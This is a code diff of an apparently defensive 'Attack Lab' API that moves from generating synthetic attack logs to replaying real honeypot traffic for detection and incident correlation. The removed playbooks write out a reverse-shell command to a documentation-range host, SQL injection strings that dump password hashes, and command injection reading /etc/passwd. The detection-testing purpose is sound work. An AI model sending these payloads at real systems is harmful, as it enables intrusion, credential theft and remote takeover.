@@ -1,249 +1,239 @@
-"""Attack Lab: simulate a simple attack as the raw logs a real server would write, detect it, correlate it.
+"""Attack Lab: replay a REAL attacker's real traffic against one of our assets, detect it, link it to our intel.
 
-  POST /api/attack-lab/run       generate logs -> detection.analyze_lines -> SecurityEvents -> CorrelationEngine
-  POST /api/attack-lab/analyze   paste your own log lines; detection only, nothing stored
-  GET  /api/attack-lab/playbooks the attacks we can simulate
-  GET  /api/attack-lab/rules     the detection rulebook (exact logic and thresholds)
+  GET  /api/attack-lab/attackers  real attackers from SANS ISC honeypots/firewall sensors (data/cache/isc.json)
+  POST /api/attack-lab/run        replay one attacker -> detection.analyze_lines -> intel links -> CorrelationEngine
+  POST /api/attack-lab/analyze    paste your own log lines; detection only, nothing stored
+  GET  /api/attack-lab/rules      the detection rulebook (exact logic and thresholds)
 
-Everything generated here is synthetic text written in-process. No packet is sent anywhere. Attacker addresses are
-from the documentation ranges (203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24) and can never be real hosts.
+What is real: every request URL, user agent, source IP, date, target port and the attacker's reputation (SANS ISC
+CC BY-NC-SA 4.0), and the CVE / KEV / EPSS facts (our NVD + CISA feeds). What is not: the target. The traffic hit SANS
+sensors, not us, so it is REPLAYED against an asset from our simulated inventory, and the incident says so. The source
+gives dates but no time of day, so replays keep the original order and rules that need timing say "on <date>".
 """
-import hashlib
-import random
 import uuid
-from datetime import datetime, timedelta, timezone
-from typing import Annotated, Any, Literal
-from urllib.parse import quote
+from collections import Counter, defaultdict
+from datetime import datetime, timezone
+from functools import lru_cache
+from typing import Annotated, Any
 
 from fastapi import APIRouter, Depends, HTTPException
 from pydantic import BaseModel, Field
+from sqlalchemy import select
 from sqlalchemy.orm import Session
+
+from collectors import isc
 
 from . import detection
 from .asset_store import get_asset_store
 from .contracts import Asset, SecurityEvent
-from .correlator import CorrelationEngine
+from .correlator import CorrelationEngine, threat_from_row
 from .database import get_db
+from .matcher import exposed, match_asset, match_threat
+from .models import IOCRow, Threat
 
 router = APIRouter()
-IST = timezone(timedelta(hours=5, minutes=30))
-Scenario = Literal["brute_force", "sql_injection", "port_scan", "command_injection", "normal_traffic"]
+MAX_REPLAY = 200  # lines replayed per run (the attacker's first N real records, in original order)
+DEFAULT_TARGET = {"web": "GOV-WEB-01", "login": "GOV-VPN-01", "scan": "PWR-FW-01"}
 
 
-class Ctx:
-    """Everything a playbook needs to write believable log lines for one target asset."""
+# --- the real data -------------------------------------------------------------------------------------------
 
-    def __init__(self, asset: Asset, succeed: bool, seed: str):
-        self.asset, self.host, self.succeed = asset, asset.hostname, succeed
-        self.rng = random.Random(seed)
-        h = int(hashlib.sha1(asset.asset_id.encode()).hexdigest(), 16)
-        self.ip = f"10.{20 + h % 40}.{h // 40 % 250}.{10 + h // 10000 % 200}"
-        self.t = datetime.now(IST).replace(microsecond=0) - timedelta(minutes=3)
-
-    def tick(self, seconds: float) -> datetime:
-        self.t += timedelta(seconds=seconds)
-        return self.t
-
-    def syslog(self, prog: str, msg: str, gap: float = 1.0) -> str:
-        return f"{self.tick(gap).isoformat()} {self.host} {prog}: {msg}"
-
-    def web(self, src: str, path: str, status: int, size: int, ua: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            gap: float = 1.0) -> str:
-        when = self.tick(gap).strftime("%d/%b/%Y:%H:%M:%S %z")
-        return f'{src} - - [{when}] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"'
+@lru_cache(maxsize=2)
+def _traffic(stamp: str) -> tuple[dict, dict, dict]:
+    data = isc.load() or {}
+    web, fw = defaultdict(list), defaultdict(list)
+    for r in data.get("web_requests", []):
+        web[r["source"]].append(r)
+    for r in data.get("firewall", []):
+        fw[r["source"]].append(r)
+    return web, fw, data
 
 
-def step(title: str, detail: str, lines: list[str], actor: str = "attacker") -> dict:
-    return {"title": title, "detail": detail, "actor": actor, "lines": lines}
+def traffic() -> tuple[dict, dict, dict]:
+    path = isc.CACHE / "isc.json"
+    return _traffic(str(path.stat().st_mtime) if path.exists() else "none")
 
 
-# --- playbooks -----------------------------------------------------------------------------------------
-
-def brute_force(c: Ctx) -> list[dict]:
-    atk, staff = "203.0.113.45", f"10.{c.rng.randint(1, 9)}.4.21"
-    normal = [c.syslog("sshd[1840]", f"Failed password for priya from {staff} port 50112 ssh2", 40),
-              c.syslog("sshd[1840]", f"Accepted password for priya from {staff} port 50112 ssh2", 6)]
-    tries = []
-    for i in range(36):
-        user = "root" if i % 4 == 3 else "admin"
-        tries.append(c.syslog(f"sshd[{2200 + i}]", f"Failed password for {user} from {atk} port {c.rng.randint(40000, 60999)} ssh2",
-                              1.0 + c.rng.random() * 0.5 if i else 20))
-    steps = [step("Normal use", "A staff member mistypes her password once, then logs in. This must NOT be flagged.",
-                  normal, "staff"),
-             step("Automated password guessing",
-                  f"Attacker {atk} runs a guessing tool (Hydra-style) against the login: 36 common passwords for "
-                  "'admin' and 'root' in under a minute.", tries)]
-    if c.succeed:
-        steps.append(step("A guess works", "The password for 'admin' was weak. The attacker is now logged in as admin.",
-                          [c.syslog("sshd[2240]", f"Accepted password for admin from {atk} port 41877 ssh2", 2)]))
-    else:
-        steps.append(step("Attacker gives up", "No guess worked. The account was not compromised.", []))
-    return steps
+def _host_ip(asset: Asset) -> str:
+    return asset.ip or "10.0.0.1"
 
 
-def sql_injection(c: Ctx) -> list[dict]:
-    atk, tool = "203.0.113.77", "sqlmap/1.8.4#stable (https://sqlmap.org)"
-    page = "/netbanking/statement?acct="
-
-    def inj(payload: str) -> str:
-        return page + quote("1002" + payload, safe="")
-
-    customers = [c.web("192.0.2.14", "/netbanking/login", 200, 3120, gap=30),
-                 c.web("192.0.2.31", "/netbanking/search?q=" + quote("O'Neil Road branch"), 200, 3954),
-                 c.web("192.0.2.14", page + "1002", 200, 4210)]
-    browse = [c.web(atk, page + "1002", 200, 4180, gap=20), c.web(atk, page + "1003", 200, 4236)]
-    probe = [c.web(atk, inj("'"), 500, 812, tool, 4),
-             c.web(atk, inj("' OR '1'='1"), 200, 4180, tool),
-             c.web(atk, inj("' AND SLEEP(5)-- -"), 200, 4180, tool, 6)]
-    ok = c.succeed
-    extract = [c.web(atk, inj("' UNION SELECT NULL,NULL,NULL-- -"), 500, 812, tool),
-               c.web(atk, inj("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -"),
-                     200 if ok else 403, 21544 if ok else 162, tool),
-               c.web(atk, inj("' UNION SELECT username,password_hash,email FROM customers-- -"),
-                     200 if ok else 403, 48213 if ok else 162, tool)]
-    return [
-        step("Normal customers", "Real users log in and search. One search contains an apostrophe (O'Neil) "
-             "- a quote alone must NOT be flagged.", customers, "customers"),
-        step("Attacker looks around", f"{atk} opens the account statement page like a normal customer.", browse),
-        step("Probing for injection", "An automated tool (sqlmap) adds a quote, an always-true condition and a "
-             "5-second delay to the account number to see if the database obeys.", probe),
-        step("Extracting data" if ok else "Extraction blocked",
-             "UNION SELECT is used to list the database tables and then dump usernames and password hashes. "
-             + ("The responses are 5-10x larger than a normal page: the data came back."
-                if ok else "The web application firewall returns 403: nothing came back."), extract),
-    ]
+def raw_lines(ip: str, asset: Asset) -> list[str]:
+    """The attacker's real records as the log lines our sensors would have written (date only: 00:00:00)."""
+    web, fw, _ = traffic()
+    out = []
+    for r in web.get(ip, []):
+        day = datetime.fromisoformat(r["date"]).strftime("%d/%b/%Y")
+        url = r["url"].replace(" ", "%20").replace('"', "%22")
+        ua = (r["user_agent"] or "-").replace('"', "'")
+        # The honeypot answered 404 (ISC's 404 project): the request is real, the response is the honeypot's.
+        out.append(f'{ip} - - [{day}:00:00:00 +0000] "GET {url} HTTP/1.1" 404 0 "-" "{ua}"')
+    for r in fw.get(ip, []):
+        out.append(f"{r['date']}T00:00:00+00:00 {asset.hostname} kernel: [FW] IN=eth0 SRC={ip} DST={_host_ip(asset)} "
+                   f"PROTO=TCP SPT={r['source_port']} DPT={r['target_port']} FLAGS=SYN ACTION=DROP")
+    return out
 
 
-def port_scan(c: Ctx) -> list[dict]:
-    atk = "198.51.100.23"
-    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389,
-             5432, 5900, 6379, 8080, 8443, 9200, 11211, 27017]
-    open_ports = {80, 443}
-    fw = lambda src, p, gap: c.syslog("kernel", f"[FW] IN=eth0 SRC={src} DST={c.ip} PROTO=TCP SPT={c.rng.randint(32768, 60999)} "
-                                                f"DPT={p} FLAGS=SYN ACTION={'ACCEPT' if p in open_ports else 'DROP'}", gap)
-    normal = [fw(f"192.0.2.{c.rng.randint(10, 200)}", 443, 25 if i == 0 else 4) for i in range(4)]
-    scan = [fw(atk, p, 15 if i == 0 else 0.2) for i, p in enumerate(c.rng.sample(ports, len(ports)))]
-    grab = [c.web(atk, "/", 200, 5120, "Mozilla/5.0 zgrab/0.x", 3)]
-    return [step("Normal visitors", "Visitors connect to the website on port 443 only.", normal, "customers"),
-            step("Port sweep", f"{atk} knocks on {len(ports)} different ports in a few seconds to learn which "
-                 "services are running (SSH, databases, remote desktop ...).", scan),
-            step("Fingerprinting", "It found 80 and 443 open and fetches the home page to identify the software. "
-                 "Nothing is exploited yet: this is reconnaissance.", grab)]
+def _kind(dets: list[dict]) -> str:
+    ids = {d["rule_id"] for d in dets}
+    return "login" if "NET-LOGIN-001" in ids else "scan" if "NET-SCAN-001" in ids else "web"
 
 
-def command_injection(c: Ctx) -> list[dict]:
-    atk, c2, ua = "203.0.113.99", "198.51.100.7", "curl/8.5.0"
-    tool = "/billing/tools/ping?host="
-    shell = f"bash -c 'bash -i >& /dev/tcp/{c2}/4444 0>&1'"
-    ok = c.succeed
-    s, blocked = (200, 403)
-    steps = [
-        step("Finds a 'test connection' page", "The billing site has a diagnostics page that pings a host you type in.",
-             [c.web(atk, tool + "8.8.8.8", 200, 640, ua, 30)]),
-        step("Tests if commands run", "Adds ';id' and ';cat /etc/passwd' after the address to see if the server runs them.",
-             [c.web(atk, tool + quote("8.8.8.8;id", safe=""), s if ok else blocked, 702 if ok else 162, ua, 5),
-              c.web(atk, tool + quote("8.8.8.8;cat /etc/passwd", safe=""), s if ok else blocked, 2210 if ok else 162, ua, 4)]),
-        step("Sends a reverse shell", f"Injects a command that makes the server connect back to {c2}:4444 and hand "
-             "the attacker a live shell.", [c.web(atk, tool + quote("8.8.8.8;" + shell, safe=""),
-                                                  s if ok else blocked, 640 if ok else 162, ua, 6)]),
-    ]
-    if ok:
-        steps += [
-            step("Server runs the command", "The PHP process starts a shell. Host process auditing records it.",
-                 [c.syslog("auditd[611]", f'type=EXECVE ppid=812 parent=php-fpm pid=4410 exe=/bin/sh cmd="sh -c ping -c1 8.8.8.8;{shell}"', 0),
-                  c.syslog("auditd[611]", 'type=EXECVE ppid=4410 parent=sh pid=4411 exe=/bin/bash cmd="bash -i"', 0)]),
-            step("Shell calls home", f"The server opens an outbound connection to the attacker at {c2}:4444.",
-                 [c.syslog("conntrack[90]", f"NEW tcp src={c.ip} sport=51544 dst={c2} dport=4444 dir=outbound", 1)]),
-        ]
-    else:
-        steps.append(step("Blocked", "The web application firewall rejected every injected request (HTTP 403). "
-                          "No process started and no connection went out.", []))
-    return steps
+@lru_cache(maxsize=2)
+def _catalogue(stamp: str) -> list[dict]:
+    web, fw, data = traffic()
+    rep = data.get("reputation", {})
+    probe = get_asset_store().get(DEFAULT_TARGET["web"])
+    profiles = []
+    for ip in set(web) | set(fw):
+        a = detection.analyze_lines(raw_lines(ip, probe)[:MAX_REPLAY])
+        dets = a["detections"]
+        if not dets and ip not in rep:
+            continue
+        cves = sorted({c for d in dets for c in d["indicators"].get("cve_ids", [])})
+        dates = sorted({r["date"] for r in web.get(ip, []) + fw.get(ip, [])})
+        r = rep.get(ip, {})
+        profiles.append({
+            "ip": ip, "kind": _kind(dets), "headline": a["verdict"]["headline"],
+            "attack_types": a["verdict"]["attack_types"], "rules": [d["rule_id"] for d in dets], "cve_ids": cves,
+            "web_requests": len(web.get(ip, [])), "firewall_records": len(fw.get(ip, [])),
+            "first_seen": dates[0] if dates else None, "last_seen": dates[-1] if dates else None,
+            "country": r.get("country"), "as_name": r.get("as_name"), "threat_feeds": r.get("threat_feeds", []),
+            "user_agents": [u for u, _ in Counter(x["user_agent"] for x in web.get(ip, [])).most_common(2)],
+            "detected": bool(dets),
+        })
+    order = {"WEB-EXPLOIT-001": 0, "WEB-CMDI-001": 1, "WEB-SQLI-001": 1, "WEB-TRAV-001": 2, "WEB-XSS-001": 2,
+             "NET-LOGIN-001": 3, "NET-SCAN-001": 4, "WEB-RECON-001": 5}
+    rank = lambda p: (min((order.get(r, 9) for r in p["rules"]), default=10), -len(p["threat_feeds"]),  # noqa: E731
+                      -(p["web_requests"] + p["firewall_records"]), p["ip"])
+    profiles.sort(key=rank)
+    # Keep the list readable: every exploit/injection attacker, the top 4 of each other kind, 2 undetected controls.
+    out, seen = [], Counter()
+    for p in profiles:
+        key = p["rules"][0] if p["rules"] else "none"
+        cap = 99 if key in ("WEB-EXPLOIT-001", "WEB-CMDI-001", "WEB-SQLI-001") else 2 if key == "none" else 4
+        if seen[key] < cap:
+            out.append(p)
+            seen[key] += 1
+    return out
 
 
-def normal_traffic(c: Ctx) -> list[dict]:
-    users = [f"192.0.2.{n}" for n in (11, 27, 45, 63, 88)]
-    pages = ["/", "/outages?district=Agra", "/outages?district=Kanpur+Nagar", "/search?q=" + quote("O'Neil Road"),
-             "/static/map.js", "/api/outages?since=2026-10-31T09:00", "/favicon.ico", "/report?type=no+power&ward=12"]
-    web = []
-    for i in range(16):
-        p = pages[i % len(pages)]
-        web.append(c.web(users[i % len(users)], p, 404 if p == "/favicon.ico" else 200,
-                         c.rng.randint(1800, 6200), gap=30 if i == 0 else c.rng.randint(2, 9)))
-    staff = f"10.{c.rng.randint(1, 9)}.4.22"
-    auth = [c.syslog("sshd[1902]", f"Failed password for ravi from {staff} port 50213 ssh2", 5),
-            c.syslog("sshd[1902]", f"Failed password for ravi from {staff} port 50213 ssh2", 4),
-            c.syslog("sshd[1902]", f"Accepted password for ravi from {staff} port 50213 ssh2", 5)]
-    fw = [c.syslog("kernel", f"[FW] IN=eth0 SRC={u} DST={c.ip} PROTO=TCP SPT={c.rng.randint(32768, 60999)} "
-                             f"DPT=443 FLAGS=SYN ACTION=ACCEPT", 2) for u in users]
-    return [step("Citizens use the portal", "Ordinary page views, a search with an apostrophe and a missing favicon (404).",
-                 web, "customers"),
-            step("Admin mistypes a password", "Two typos, then a successful login: normal human behaviour.", auth, "staff"),
-            step("Normal connections", "HTTPS connections from five visitors.", fw, "customers")]
+def catalogue() -> list[dict]:
+    path = isc.CACHE / "isc.json"
+    return _catalogue(str(path.stat().st_mtime) if path.exists() else "none")
 
 
-PLAYBOOKS: dict[str, dict[str, Any]] = {
-    "brute_force": {"name": "Brute-force login", "fn": brute_force, "default_target": "GOV-VPN-01",
-                    "what": "Guessing passwords over and over until one works.",
-                    "outcome_label": "Password is guessed", "log_sources": ["auth"]},
-    "sql_injection": {"name": "SQL injection", "fn": sql_injection, "default_target": "BNK-NET-01",
-                      "what": "Typing database commands into a web form so the site leaks its database.",
-                      "outcome_label": "Data is extracted", "log_sources": ["web access"]},
-    "port_scan": {"name": "Port scan", "fn": port_scan, "default_target": "GOV-WEB-01",
-                  "what": "Knocking on every network port to map which services are running (reconnaissance).",
-                  "outcome_label": None, "log_sources": ["firewall", "web access"]},
-    "command_injection": {"name": "Command injection -> reverse shell", "fn": command_injection, "default_target": "WTR-WEB-01",
-                          "what": "Sneaking an operating-system command into a web field to take remote control of the server.",
-                          "outcome_label": "Server is taken over", "log_sources": ["web access", "process audit", "connection tracking"]},
-    "normal_traffic": {"name": "Normal traffic (control)", "fn": normal_traffic, "default_target": "PWR-WEB-01",
-                       "what": "Ordinary users, typos and searches. Proves the rules do not fire on normal activity.",
-                       "outcome_label": None, "log_sources": ["web access", "auth", "firewall"]},
-}
+# --- linking the attack to our threat intelligence ------------------------------------------------------------
+
+def intel(db: Session, ip: str, asset: Asset, dets: list[dict]) -> dict:
+    """Attacker reputation (ISC + our IOC feeds) and, per exploited CVE, our feed facts + what the matcher says."""
+    _, _, data = traffic()
+    iocs = [{"source": s, "type": t, "malware_family": f} for s, t, f in
+            db.execute(select(IOCRow.source, IOCRow.ioc_type, IOCRow.malware_family).where(IOCRow.value == ip))]
+    store = get_asset_store()
+    cves = []
+    for cve in sorted({c for d in dets for c in d["indicators"].get("cve_ids", [])}):
+        row = db.get(Threat, cve)
+        if row is None:
+            cves.append({"cve_id": cve, "in_feed": False})
+            continue
+        threat = threat_from_row(row)
+        m = match_asset(asset, threat)
+        others = [x.asset_id for x in exposed(match_threat(threat, store.all())) if x.asset_id != asset.asset_id]
+        cves.append({"cve_id": cve, "in_feed": True, "title": row.title, "source": row.source, "kev_listed": row.kev_listed,
+                     "epss": row.epss, "cvss": row.cvss, "kev_date_added": str(row.kev_date_added) if row.kev_date_added else None,
+                     "target_match": m.match_detail, "target_reason": m.reason, "other_exposed_assets": others})
+    return {"attacker": {"ip": ip, "reputation": data.get("reputation", {}).get(ip), "our_ioc_hits": iocs,
+                         "source": "SANS Internet Storm Center (CC BY-NC-SA 4.0) + our abuse.ch/OTX/IP-reputation IOCs"},
+            "cves": cves}
 
 
-# --- detections -> SecurityEvents for the correlation engine ------------------------------------------
+# --- detections -> SecurityEvents for the correlation engine --------------------------------------------------
 
-EVENT_TYPE = {"brute_force": "auth", "credential_compromise": "auth", "port_scan": "network",
+EVENT_TYPE = {"brute_force": "auth", "credential_compromise": "auth", "port_scan": "network", "login_hammering": "network",
               "sql_injection": "http", "data_exposure": "http", "command_injection": "http", "http_anomaly": "http",
+              "exploit_attempt": "http", "exploit_on_vulnerable_asset": "http", "recon_probe": "http",
               "unexpected_process": "process", "outbound_connection": "network"}
 
 
-def to_events(run_id: str, asset: Asset, detections: list[dict]) -> list[SecurityEvent]:
+def to_events(run_id: str, asset: Asset, detections: list[dict], vulnerable: set[str] = frozenset()) -> list[SecurityEvent]:
     events = []
     for i, d in enumerate(detections):
+        signal, reason = d["signal"], d["reason"]
+        hit = sorted(set(d["indicators"].get("cve_ids", [])) & vulnerable)
+        if d["rule_id"] == "WEB-EXPLOIT-001" and hit:
+            signal = "exploit_on_vulnerable_asset"
+            reason += f" — and our matcher says {asset.asset_id} runs a version vulnerable to {', '.join(hit)}"
         details: dict[str, Any] = {
-            "attack_signal": d["signal"], "attack_type": d["attack_type"], "attack_label": d["label"],
-            "detection_reason": d["reason"], "stage": d["stage"], "mitre": [m["id"] for m in d["mitre"]],
+            "attack_signal": signal, "attack_type": d["attack_type"], "attack_label": d["label"],
+            "detection_reason": reason, "stage": d["stage"], "mitre": [m["id"] for m in d["mitre"]],
             "matched_lines": d["count"], "sample": d["evidence"][0]["raw"] if d["evidence"] else None,
+            "cve_ids": d["indicators"].get("cve_ids", []), "replayed_real_traffic": True,
         }
         if d["src_ip"]:
             details["src_ip"] = d["src_ip"]
-        if d["signal"] == "outbound_connection":
+        if signal == "outbound_connection":
             details |= {"direction": "outbound", "dest_ip": d["indicators"]["dest_ip"], "dest_port": d["indicators"]["dest_port"]}
         at = d["last_seen"] or d["first_seen"]
         events.append(SecurityEvent(
             event_id=f"LAB-{run_id}-{i + 1:02d}-{d['rule_id']}", asset_id=asset.asset_id,
             timestamp=datetime.fromisoformat(at) if at else datetime.now(timezone.utc),
-            event_type=EVENT_TYPE[d["signal"]], source_sensor=f"attack-lab/{d['rule_id']}", details=details,
-            is_simulated=True, rule_id=d["rule_id"], confidence=d["confidence"]))
+            event_type=EVENT_TYPE[signal], source_sensor=f"attack-lab/{d['rule_id']}", details=details,
+            is_simulated=True,  # the traffic is real, but it never reached OUR asset: the incident is a replay
+            rule_id=d["rule_id"], confidence=d["confidence"]))
     return events
 
 
-# --- API ------------------------------------------------------------------------------------------------
+def _steps(lines: list[dict]) -> list[dict]:
+    """Group the replayed lines by what they are, in order of first appearance (lines keep their real order)."""
+    names = {"exploit": ("Exploit attempts", "Requests carrying published exploits for specific CVEs."),
+             "inject": ("Injection / traversal payloads", "Requests trying to run commands, read files or inject scripts."),
+             "recon": ("Scanning for secrets and admin pages", "Wordlist requests for .env, .git, phpinfo, admin panels..."),
+             "web": ("Other requests", "Requests that match no rule (probing, crawling)."),
+             "login": ("Login-port hammering", "Connection attempts to SSH / Telnet / RDP / VNC."),
+             "port": ("Port probes", "Connection attempts to other ports, mapping what is open.")}
+    groups: dict[str, list[int]] = {}
+    for l in lines:
+        fam = {m["family"] for m in l["matches"]}
+        dpt = l["raw"].split("DPT=")[1].split()[0] if "DPT=" in l["raw"] else None
+        k = ("exploit" if "known_exploit" in fam else "inject" if fam - {"recon"} else "recon" if "recon" in fam
+             else ("login" if int(dpt) in detection.CONFIG["login_ports"] else "port") if dpt else "web")
+        groups.setdefault(k, []).append(l["line_no"])
+    return [{"title": names[k][0], "detail": names[k][1], "actor": "attacker", "line_nos": v} for k, v in groups.items()]
+
+
+# --- API ------------------------------------------------------------------------------------------------------
 
 class RunRequest(BaseModel):
-    scenario: Scenario
-    target_asset_id: str | None = None  # default: the playbook's suggested target
-    succeed: bool = True  # False = the attack is attempted but blocked / fails
+    attacker_ip: str = Field(min_length=3, max_length=64)
+    target_asset_id: str | None = None  # default: an asset our matcher says is vulnerable to the exploited CVE
 
 
 class AnalyzeRequest(BaseModel):
     lines: list[Annotated[str, Field(max_length=4096)]] = Field(min_length=1, max_length=500)  # 422 beyond
 
 
-@router.get("/api/attack-lab/playbooks", tags=["attack-lab"])
-def playbooks() -> list[dict]:
-    return [{"scenario": k, **{f: v for f, v in p.items() if f != "fn"}} for k, p in PLAYBOOKS.items()]
+@router.get("/api/attack-lab/attackers", tags=["attack-lab"])
+def attackers(db: Session = Depends(get_db)) -> dict:
+    """Real attackers seen by SANS ISC honeypots/firewall sensors, with what our rules detect in their traffic."""
+    _, _, data = traffic()
+    items = catalogue()
+    for p in items:
+        p["default_target"] = _default_target(db, p)
+    return {"source": "SANS Internet Storm Center (isc.sans.edu), CC BY-NC-SA 4.0", "retrieved_at": data.get("retrieved_at"),
+            "note": data.get("note"), "web_requests": len(data.get("web_requests", [])),
+            "firewall_records": len(data.get("firewall", [])), "items": items}
+
+
+def _default_target(db: Session, p: dict) -> str:
+    store = get_asset_store()
+    for cve in p["cve_ids"]:  # prefer an asset that is actually vulnerable to what the attacker is exploiting
+        row = db.get(Threat, cve)
+        if row is not None:
+            hit = exposed(match_threat(threat_from_row(row), store.all()))
+            if hit:
+                return sorted(hit, key=lambda m: (not store.get(m.asset_id).internet_facing, m.asset_id))[0].asset_id
+    return DEFAULT_TARGET[p["kind"]]
 
 
 @router.get("/api/attack-lab/rules", tags=["attack-lab"])
@@ -251,6 +241,7 @@ def rules() -> dict:
     return {"rules": [r | {"mitre": [detection.mitre(t) for t in r["mitre"]]} for r in detection.RULES],
             "signatures": [{"id": s.sig_id, "family": s.family, "technique": s.technique, "pattern": s.pattern.pattern,
                             "strong": s.strong} for s in detection.SIGNATURES],
+            "known_exploits": [{"cve_id": cve, "name": name, "pattern": p.pattern} for p, cve, name in detection.KNOWN_EXPLOITS],
             "thresholds": detection.CONFIG}
 
 
@@ -261,40 +252,48 @@ def analyze(body: AnalyzeRequest) -> dict:
 
 
 @router.post("/api/attack-lab/run", tags=["attack-lab"],
-             responses={403: {"description": "demo mode only"}, 404: {"description": "unknown asset"}})
+             responses={403: {"description": "demo mode only"}, 404: {"description": "unknown attacker or asset"}})
 def run(body: RunRequest, db: Session = Depends(get_db)) -> dict:
-    """Simulate the attack as raw logs, detect it from the text alone, and feed what fired into the correlator."""
+    """Replay a real attacker's traffic against one of our (simulated) assets, detect it, link it to our intel."""
     from ai.llm import demo_mode
     if not demo_mode():
-        raise HTTPException(403, "the attack lab writes simulated alerts and is only available in DEMO_MODE")
-    pb = PLAYBOOKS[body.scenario]
-    asset = get_asset_store().get(body.target_asset_id or pb["default_target"])
+        raise HTTPException(403, "the attack lab writes replay incidents and is only available in DEMO_MODE")
+    profile = next((p for p in catalogue() if p["ip"] == body.attacker_ip), None)
+    if profile is None:
+        raise HTTPException(404, f"attacker {body.attacker_ip} is not in the cached SANS ISC data")
+    asset = get_asset_store().get(body.target_asset_id or _default_target(db, profile))
     if asset is None:
         raise HTTPException(404, f"asset {body.target_asset_id} not found")
 
     run_id = uuid.uuid4().hex[:8].upper()
-    steps = pb["fn"](Ctx(asset, body.succeed or not pb["outcome_label"], run_id))
-    lines, n = [], 0
-    for s in steps:
-        s["line_nos"] = list(range(n + 1, n + 1 + len(s["lines"])))
-        n += len(s["lines"])
-        lines += s.pop("lines")
-    analysis = detection.analyze_lines(lines)
+    every = raw_lines(profile["ip"], asset)
+    analysis = detection.analyze_lines(every[:MAX_REPLAY])
+    link = intel(db, profile["ip"], asset, analysis["detections"])
 
-    events = to_events(run_id, asset, analysis["detections"])
-    out = CorrelationEngine(db).ingest_events(events) if events else {"created": [], "updated": [], "incidents": []}
+    # Intel -> alert: an exploited CVE our matcher says this asset is vulnerable to gets its vulnerability alert too.
+    engine = CorrelationEngine(db)
+    vulnerable = {c["cve_id"] for c in link["cves"] if c.get("target_match") in ("confirmed_affected", "needs_verification")}
+    vuln_alerts = []
+    for cve in sorted(vulnerable):
+        out = engine.correlate_threat(threat_from_row(db.get(Threat, cve)), trigger="attack_lab")
+        vuln_alerts += [a for a in out["created"] + out["updated"]]
+    events = to_events(run_id, asset, analysis["detections"], vulnerable)
+    out = engine.ingest_events(events) if events else {"created": [], "updated": [], "incidents": []}
     note = ("No rule fired, so nothing was sent to the correlation engine and no incident exists." if not events else
-            "Added to an existing incident: same asset within the 15-minute correlation window, so the correlator "
-            "treats it as one campaign. Reset demo alerts to start clean." if not out["created"] else
-            "New incident created.")
+            "Added to an existing incident: same asset and time window, so the correlator treats it as one campaign. "
+            "Reset demo alerts to start clean." if not out["created"] else "New incident created.")
     return {
-        "run_id": run_id, "scenario": body.scenario, "name": pb["name"], "is_simulated": True,
-        "data_classification": "Simulated attack: synthetic log lines generated in-process; no traffic was sent",
+        "run_id": run_id, "scenario": profile["kind"], "kind": profile["kind"], "attacker": profile,
+        "data_classification": (f"REAL attack traffic from SANS ISC sensors ({profile['first_seen']}"
+                                f"{' to ' + profile['last_seen'] if profile['last_seen'] != profile['first_seen'] else ''}), "
+                                f"replayed against a simulated asset. Dates are real; time of day is not in the source."),
+        "is_simulated": False, "target_is_simulated": asset.is_simulated,
+        "replayed": len(analysis["lines"]), "total_records": len(every),
         "target": {"asset_id": asset.asset_id, "hostname": asset.hostname, "role": asset.role, "sector": asset.sector,
                    "criticality": asset.criticality, "internet_facing": asset.internet_facing},
-        "succeed": body.succeed if pb["outcome_label"] else None,
-        "steps": steps, **analysis,
+        "steps": _steps(analysis["lines"]), **analysis, "intel": link,
         "events_sent": [e.model_dump(mode="json") for e in events],
         "correlation": {"created": out["created"], "updated": out["updated"], "note": note,
+                        "vulnerability_alerts": sorted(set(vuln_alerts)),
                         "incidents": [i for i in out["incidents"] if asset.asset_id in i["asset_ids"]]},
     }
